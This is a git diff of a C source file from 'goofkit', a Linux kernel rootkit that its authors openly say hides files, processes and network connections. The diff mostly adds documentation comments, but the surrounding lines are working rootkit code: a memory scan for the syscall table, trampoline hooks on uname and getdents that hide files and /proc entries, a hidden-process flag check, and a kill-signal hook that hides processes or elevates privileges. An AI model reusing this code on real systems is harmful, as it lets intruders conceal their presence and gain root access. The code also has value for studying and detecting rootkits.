@@ -3,11 +3,10 @@ Project: goofkit
 Author: Jack "Hulto" McKenna 🇺🇸  & Rayne Cafaro🤔
 Description: trampolining rootkit. Used to hide files, proccesses, and network connections from the user.
 Task:
-## Comms with rootkti ##
 */
-#include "goof.h"
 
-//User defined variables
+
+#include "goof.h"
 #include "user.h"
 
 
@@ -16,6 +15,20 @@ Task:
 /* Find the syscall table.
    We will use this to refrence all of the syscalls that we want to overwrite.
    This is a necessary step since in recent versions of linux the syscall table is not exported.*/
+
+
+/* @brief find the syscall table in memory
+ *
+ * Iterate through memory until we find the close syscall (which my from understanding is exported)
+ * Once it is found back up to the start of the table and return that value.
+ *
+ * may not be needed in the new 4.X kernel it looks like the syscall table may be exported as _sys_call_table.
+ * //TODO investigate the above
+ *
+ * @param void - no params neede we just use the global definiton of the address space and where sys_close is
+ *
+ * @return the address of the syscall table
+ */
 unsigned long *find(void) {
 	unsigned long *sctable;
 	unsigned long int i = (unsigned long int)sys_close;
@@ -32,6 +45,16 @@ unsigned long *find(void) {
 	return NULL;
 }
 
+/* @brief the hacked version of uname: replaces Linux (or whatever) with Macos (or whatever)
+ *
+ * Run the OG uname to get the correct value for most things. Copy our new sysname
+ * "Macos" over the value ("Linux") and then return. Copy_to_user is required as
+ * the buf variable is an argument coming from userspace not kernel land :(
+ *
+ * @param buf struct describing system (defined in goof.h) --- taken from OG uname
+ *
+ * @return 0 on success, on error -1 --- taken from OG uname
+ */
 int goofy_uname(struct utsname *buf){
 	//Execute original funciton
 	//Calling the original function to fill out our buf variable.
@@ -50,6 +73,19 @@ int goofy_uname(struct utsname *buf){
 	return ret;
 }
 
+/* @brief the hacked version of getdents: hides files with magic string, and PID folders in /proc
+ *
+ * Iterate through directory entries (using the OG getdents return value), if we find 
+ * something we don't like a hidden file or a hidden proc folder we do not copy it 
+ * into our return value. If it is not a hidden entry we add it as the normal function
+ * would
+ *
+ * @param fd  file descriptor for file --- taken from OG getdents
+ * @param dire struct that describes directory --- taken from OG getdents
+ * @param count the number of entries in the dire --- taken from OG getdents
+ *
+ * @return on sucess the number of entries, on failure -1
+ */
 int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int count){
 	//Execute original funciton
 	int (*func_ptr)(unsigned int, struct linux_dirent *, unsigned int) = (void *)hooks[1]->trampoline;
@@ -69,6 +105,7 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 	struct inode *d_inode;
 	int proc = 0;
 
+	/// ### Credit: https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c ###
 	// From the Diamorphine rootkit
 	#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 		d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
@@ -110,6 +147,18 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 
 /// ### Credit: https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c ###
 /// More efficent than using an expanding array of PIDs
+/* @brief find a process task struct by PID
+ *
+ * Iterate through eatch task_struct currently running. If that task has a pid
+ * matching the argument pid, then return the current task struct
+ * Cannot use the find process functions built into the kernel as they are
+ * licensed unde GPL, and we are not going to use GPL as we do not wish to
+ * open source future sections of this project.
+ *
+ * @pram pid the process ID of the process being found
+ * 
+ * @return the task_struct of the process 
+ */
 struct task_struct *find_task(pid_t pid){
 	struct task_struct *tmp = current;
 	//Iterate through each process to find the desired process
@@ -121,12 +170,23 @@ struct task_struct *find_task(pid_t pid){
 	return NULL;
 }
 /// Check if process is hidden👀
+/* @brief check if process is hidden
+ *  
+ * Use the find task function to find the task struct given a PID.
+ * Check the task struct flags for the hidden bit 0x10000000 if found
+ * return that the process is hidden.
+ *
+ * @param pid the process ID that is being checked for the hidden flag
+ *
+ * @return int 0 for false, 1 for true
+ *
+ */
 int is_hidden_proc(pid_t pid){
-	//If pid DNE return
+	//If pid DNE return 0
 	if(pid == 0){ return 0; }
 	struct task_struct *res;
 	res = find_task(pid);
-	//If res DNE return
+	//If res DNE return 0
 	if(res == 0){ return 0; }
 	//If hidden return 1
 	if(res->flags & HIDDEN){
@@ -138,12 +198,14 @@ int is_hidden_proc(pid_t pid){
 
 //### END CREDIT ###
 
-/// @param pid the process ID of the process where the signal
-///		is being sent
-/// @param sig the signal being sent to the process. If this
-///		signal is one of our defined ones goofy_kill prevents
-///		the process from being killed and will hide or elevate
-///		prems.
+/* @param pid the process ID of the process where the signal
+ *		is being sent
+ * @param sig the signal being sent to the process. If this
+ *		signal is one of our defined ones goofy_kill prevents
+ *		the process from being killed and will hide or elevate
+ *		prems.
+ * @return int on sucess return 0 otherwise -1
+ */
 int goofy_kill(pid_t pid, int sig){
 	//printk("[goof] goofy_kill\n");
 	/*FAULT - invalid opcode - Relative jump is wreking everything :(
@@ -181,8 +243,9 @@ int goofy_kill(pid_t pid, int sig){
  *   	and where the new code is going
  * @param new_func the goofy function that is hooking
  *		the original function
- *	@param id numeric identifier that will define tho hook
+ * @param id numeric identifier that will define tho hook
  *		struct in an array of hook structs
+ * @returns NULL --- TODO switch to void function or provide meaningful return
 */
 unsigned char *create_tramp(unsigned long *src, unsigned long *new_func, unsigned int id, unsigned int h_len){
 	printk("[goof] hooking %p with %p\n", src, new_func);
